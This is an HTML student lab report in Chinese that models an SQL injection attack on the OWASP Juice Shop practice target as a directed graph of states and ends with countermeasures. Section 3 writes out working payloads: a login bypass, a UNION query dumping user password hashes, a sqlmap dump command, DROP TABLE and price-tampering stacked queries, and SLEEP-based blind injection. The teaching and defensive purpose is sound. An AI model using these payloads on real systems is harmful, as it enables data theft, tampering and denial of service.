@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>Work 3 — 计算机攻击分析</title>
+<link rel="stylesheet" href="../shared/report.css">
+</head>
+<body>
+
+<div class="cover">
+  <h1>实验工作 3<br>计算机攻击分析</h1>
+  <div class="sub">SQL 注入攻击的攻击链与有向图建模</div>
+  <table>
+    <tr><td class="k">姓　名</td><td>Zhang San</td></tr>
+    <tr><td class="k">学　号 (IDU)</td><td>12345678</td></tr>
+    <tr><td class="k">Variant</td><td>1</td></tr>
+    <tr><td class="k">课程</td><td>Information Security</td></tr>
+    <tr><td class="k">日　期</td><td>2026-10-19</td></tr>
+  </table>
+</div>
+
+<h2>1. 工作目的</h2>
+<p>本工作选择一个具体的计算机攻击类型，完整描述攻击者的动作序列，并把该攻击形式化为一个有向图：
+初始状态 S<sub>0</sub>（攻击者尚未介入）、若干中间状态 S<sub>i</sub>（攻击者动作或系统状态变化）、
+以及终态 S<sub>k</sub>（攻击造成的损失）。目的是练习「把非形式化的攻击叙事转换成可检查的状态机」，
+并据此推导防护措施。</p>
+
+<h2>2. 选题与攻击概述</h2>
+<p><span class="tag">选题</span><b>SQL 注入（SQL Injection, SQLi）</b>，位于手册给定列表之中，且与 Work 1、Work 2 的知识点直接衔接。</p>
+<table class="data">
+  <tr><th style="width:26%">项目</th><th>说明</th></tr>
+  <tr><td>漏洞类别</td><td>CWE-89 Improper Neutralization of Special Elements used in an SQL Command；OWASP Top 10 2021 A03: Injection</td></tr>
+  <tr><td>受影响的组件</td><td>Web 应用的登录、搜索、排序、筛选等所有把用户输入拼接进 SQL 的位置；其后端的数据库（MySQL / PostgreSQL / SQLite）</td></tr>
+  <tr><td>根本弱点</td><td>应用把「数据」当成「代码」拼进 SQL 语句，数据库无法区分开发者的语句与攻击者的输入</td></tr>
+  <tr><td>典型后果</td><td>绕过认证、读取/篡改/删除任意表、在数据库权限足够时执行系统命令（如 MySQL <code>INTO OUTFILE</code>、<code>xp_cmdshell</code>）</td></tr>
+  <tr><td>攻击者前提</td><td>能够访问一个存在注入点的 HTTP 接口（无需账号）；数据库账号权限越高，后果越严重</td></tr>
+</table>
+
+<h2>3. 攻击者的动作序列</h2>
+<p>以下以 Work 2 的 Juice Shop 靶场（或任意存在注入的登录/搜索接口）为例，给出可复现的动作与命令。
+每一步都对应有向图中的一次状态转移。</p>
+
+<h3>3.1 踩点侦察（S<sub>0</sub> → S<sub>1</sub>）</h3>
+<pre>nmap -sV -p 3000,8080 target
+curl -s http://target:3000/ | grep -Ei 'form|input|search'
+curl -s http://target:3000/rest/products/search?q=apple</pre>
+<p>目标是找出接受字符串输入、且返回内容受数据库影响的接口。此阶段攻击者尚未改变系统状态。</p>
+
+<h3>3.2 输入点探测（S<sub>1</sub> → S<sub>2</sub>）</h3>
+<pre>curl -s "http://target:3000/rest/products/search?q='"</pre>
+<p>单个引号使拼接后的 SQL 语法错误，返回 500 或 SQL 错误信息（如 <code>SQLITE_ERROR: unrecognized token</code>），
+说明输入进入了查询语句——注入点确认。</p>
+
+<h3>3.3 构造注入并绕过认证（S<sub>2</sub> → S<sub>3</sub>）</h3>
+<pre># 登录绕过：' OR 1=1--
+curl -s -X POST http://target:3000/rest/user/login \
+     -H 'Content-Type: application/json' \
+     -d '{"email":"admin@juice-sh.op'"'"' OR 1=1--","password":"x"}'
+
+# 联合查询读取其他表：')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--
+curl -s "http://target:3000/rest/products/search?q=apple'))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--"</pre>
+<p>一旦返回了本不应可见的行（用户表、密码哈希），注入即成功。此时攻击者获得了对数据库的读写能力。</p>
+
+<h3>3.4 数据外泄（S<sub>3</sub> → S<sub>4</sub> → S<sub>k1</sub>）</h3>
+<pre>sqlmap -u "http://target:3000/rest/products/search?q=apple" \
+       --batch --dbs --dump -T Users</pre>
+<p>批量导出数据，或通过 <code>UNION</code> 分页逐条带出。泄露的数据（邮箱、口令哈希、订单）离开系统边界，形成
+<b>信息窃取</b>类损失。</p>
+
+<h3>3.5 篡改或删除（S<sub>3</sub> → S<sub>5</sub> → S<sub>k2</sub>）</h3>
+<pre># 堆叠查询（数据库/驱动支持时）
+curl -s "http://target/search?q=x'; UPDATE Products SET price=0 WHERE id=1;--"
+curl -s "http://target/search?q=x'; DROP TABLE Reviews;--"</pre>
+<p>价格被改为 0 或表被删除，业务数据完整性被破坏，形成<b>修改/删除信息</b>类损失。</p>
+
+<h3>3.6 盲注与拒绝服务（S<sub>2</sub> → S<sub>6</sub> → S<sub>k3</sub>）</h3>
+<pre># 布尔盲注：页面真假差异
+curl -s "http://target/search?q=x' AND SUBSTR((SELECT password FROM Users LIMIT 1),1,1)='a'--"
+# 时间盲注：用 SLEEP 逐位推断，同时大量占用数据库连接
+curl -s "http://target/search?q=x' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--"</pre>
+<p>当回显被关闭、过滤较严时，攻击者改用布尔/时间盲注；每个请求都让数据库执行一次重量级子查询，
+在并发场景下迅速耗尽连接池与 CPU，形成<b>拒绝服务</b>类损失。</p>
+
+<h2>4. 有向图模型</h2>
+<figure>
+  <img src="digraph.png" alt="SQL injection attack digraph">
+  <figcaption>图 1　SQL 注入攻击的有向图：S<sub>0</sub> 为初始态，S<sub>i</sub> 为中间态，S<sub>k</sub> 为损失终态；
+  每条边上的文字是该转移对应的攻击者动作。</figcaption>
+</figure>
+
+<h3>4.1 状态说明</h3>
+<table class="data">
+  <tr><th style="width:12%">状态</th><th style="width:40%">含义</th><th>判定依据（如何观测到）</th></tr>
+  <tr><td>S<sub>0</sub></td><td>系统正常运行，无入侵者影响</td><td>基线流量、无异常查询</td></tr>
+  <tr><td>S<sub>1</sub></td><td>攻击者完成侦察，掌握接口与参数</td><td>Web 日志中出现扫描特征（目录枚举、可疑 UA）</td></tr>
+  <tr><td>S<sub>2</sub></td><td>确认注入点（输入影响 SQL 语义）</td><td>日志中出现单引号、<code>--</code>、<code>UNION</code> 等 payload</td></tr>
+  <tr><td>S<sub>3</sub></td><td>注入成功，获得越权数据访问能力</td><td>异常返回行数、报错信息、非正常查询计划</td></tr>
+  <tr><td>S<sub>4</sub></td><td>批量导出数据</td><td>短时间内大量 <code>SELECT</code>、导出流量激增</td></tr>
+  <tr><td>S<sub>5</sub></td><td>数据被篡改或删除</td><td><code>UPDATE</code>/<code>DELETE</code>/<code>DROP</code> 审计记录</td></tr>
+  <tr><td>S<sub>6</sub></td><td>盲注/重查询，资源被大量占用</td><td>数据库 CPU、慢查询、连接数异常升高</td></tr>
+  <tr><td>S<sub>k1</sub></td><td>终态：信息窃取</td><td>敏感数据出现在外部（泄露样本、暗网）</td></tr>
+  <tr><td>S<sub>k2</sub></td><td>终态：信息被修改/删除</td><td>数据校验失败、业务对账不平</td></tr>
+  <tr><td>S<sub>k3</sub></td><td>终态：拒绝服务</td><td>接口超时、5xx 比例上升、连接池耗尽</td></tr>
+</table>
+
+<h3>4.2 边（转移）说明</h3>
+<table class="data">
+  <tr><th style="width:16%">转移</th><th style="width:30%">攻击者动作</th><th>为什么能推进</th></tr>
+  <tr><td>S<sub>0</sub>→S<sub>1</sub></td><td>爬站、端口扫描、接口枚举</td><td>应用对外暴露了可枚举的接口与参数</td></tr>
+  <tr><td>S<sub>1</sub>→S<sub>2</sub></td><td>提交引号/括号，观察报错</td><td>错误信息回显暴露了 SQL 结构</td></tr>
+  <tr><td>S<sub>2</sub>→S<sub>3</sub></td><td>构造 <code>OR 1=1--</code>、<code>UNION SELECT</code></td><td>输入被拼接进语句，逻辑被改写</td></tr>
+  <tr><td>S<sub>3</sub>→S<sub>4</sub></td><td>dump 目标表</td><td>数据库账号可读这些表</td></tr>
+  <tr><td>S<sub>4</sub>→S<sub>k1</sub></td><td>外带数据</td><td>数据离开系统边界即构成泄露</td></tr>
+  <tr><td>S<sub>3</sub>→S<sub>5</sub></td><td>堆叠查询写入/删除</td><td>数据库账号具备写权限</td></tr>
+  <tr><td>S<sub>5</sub>→S<sub>k2</sub></td><td>破坏数据完整性</td><td>无备份/无审计则不可恢复</td></tr>
+  <tr><td>S<sub>2</sub>→S<sub>6</sub></td><td>改用布尔/时间盲注</td><td>即使无回显，语义差异仍可被观测</td></tr>
+  <tr><td>S<sub>6</sub>→S<sub>k3</sub></td><td>并发发送 <code>SLEEP()</code> 请求</td><td>每个请求占用连接与 CPU，资源被耗尽</td></tr>
+</table>
+
+<h2>5. 损失分析</h2>
+<table class="data">
+  <tr><th style="width:24%">损失类别</th><th>在本攻击中的具体表现</th></tr>
+  <tr><td>信息窃取</td><td>用户表（邮箱、口令哈希）、订单、评论等内容被导出；口令哈希可进一步离线爆破并横向登录其他系统</td></tr>
+  <tr><td>信息修改或删除</td><td>价格被篡改（0 元下单）、评论被删、表被 <code>DROP</code>，破坏业务完整性与可追溯性</td></tr>
+  <tr><td>拒绝服务/访问</td><td>盲注与重查询占满数据库连接池，正常用户无法登录或下单</td></tr>
+</table>
+<p>三类损失可能同时发生：一次成功的注入往往先窃取、再篡改、最后以资源耗尽收场。图中从 S<sub>0</sub> 出发的每一条路径
+都终止于某个 S<sub>k</sub>，没有「悬空」的中间状态。</p>
+
+<h2>6. 对策</h2>
+<h3>6.1 预防（消除转移的前提）</h3>
+<ul>
+  <li><b>参数化查询 / 预编译语句</b>：让输入永远作为数据绑定，而不是拼接进 SQL 文本（Work 1 中的实现方式）。</li>
+  <li><b>白名单校验</b>：对排序字段、表名等无法参数化的位置使用枚举值映射。</li>
+  <li><b>最小权限数据库账号</b>：Web 应用账号只授予必要的 <code>SELECT/INSERT</code>，禁止 <code>FILE</code>、<code>SUPER</code> 权限，切断 S<sub>3</sub>→S<sub>5</sub> 与系统命令执行。</li>
+  <li><b>关闭详细报错</b>：统一错误页，去掉 S<sub>1</sub>→S<sub>2</sub> 的反馈信号。</li>
+</ul>
+<h3>6.2 检测（尽早发现 S<sub>1</sub>–S<sub>3</sub>）</h3>
+<ul>
+  <li>WAF 规则匹配 <code>UNION</code>、<code>SLEEP(</code>、注释符等特征，并对 4xx/5xx 突增告警。</li>
+  <li>数据库审计：记录非常规的 <code>UNION</code>、<code>INFORMATION_SCHEMA</code> 访问与大批量导出。</li>
+  <li>慢查询与连接数监控，用于识别 S<sub>6</sub> 的盲注行为。</li>
+</ul>
+<h3>6.3 响应（限制 S<sub>k</sub> 的影响）</h3>
+<ul>
+  <li>对泄露凭据强制重置口令并启用 2FA（与 Work 4 呼应）。</li>
+  <li>从可信备份恢复被篡改数据，保留日志用于取证。</li>
+  <li>限流与熔断，避免盲注把整个数据库拖垮。</li>
+</ul>
+
+<h2>7. 结论</h2>
+<p>SQL 注入的本质是「数据与代码的边界被打破」。用有向图描述它，可以把一句模糊的「攻击者注入了 SQL」
+拆成可验证的状态与动作：侦察 → 探测 → 注入 → 外泄/篡改/资源耗尽。图上的每条边都对应一个具体动作，
+因此每条边也对应一个可以下手阻断的位置——这正是形式化建模对防御设计的价值：先找边，再找断点。</p>
+<p>本工作也说明，同一种攻击可以因为攻击者策略不同而画出不同的图（例如只做盲注、或只做认证绕过），
+但 S<sub>0</sub> 与 S<sub>k</sub> 的定义必须稳定，否则图就失去了可比性。</p>
+
+<h2>附录　控制问题要点</h2>
+<ol>
+  <li><b>漏洞与利用的区别</b>：漏洞是系统里客观存在的缺陷（CWE-89）；利用是让该缺陷产生效果的具体输入/工具（sqlmap）。
+      本图主要建模「利用」的过程，S<sub>0</sub> 是漏洞存在但未被触发的状态。</li>
+  <li><b>为什么必须显式定义 S<sub>0</sub> 与 S<sub>k</sub></b>：没有 S<sub>0</sub> 就无法判断攻击从哪一刻开始，没有 S<sub>k</sub> 就无法衡量损失，
+      图会退化成一张流程图。</li>
+  <li><b>同一攻击的不同图</b>：取决于攻击者选择「有回显注入」还是「盲注」、是否追求持久化，路径不同但终点同类。</li>
+  <li><b>损失类别</b>：本攻击覆盖窃取、篡改/删除、拒绝服务三类。</li>
+  <li><b>对防御的价值</b>：图上每条边都是一个可加固的环节，按「代价最小、收益最大」优先切断靠近 S<sub>0</sub> 的边。</li>
+</ol>
+
+</body>
+</html>
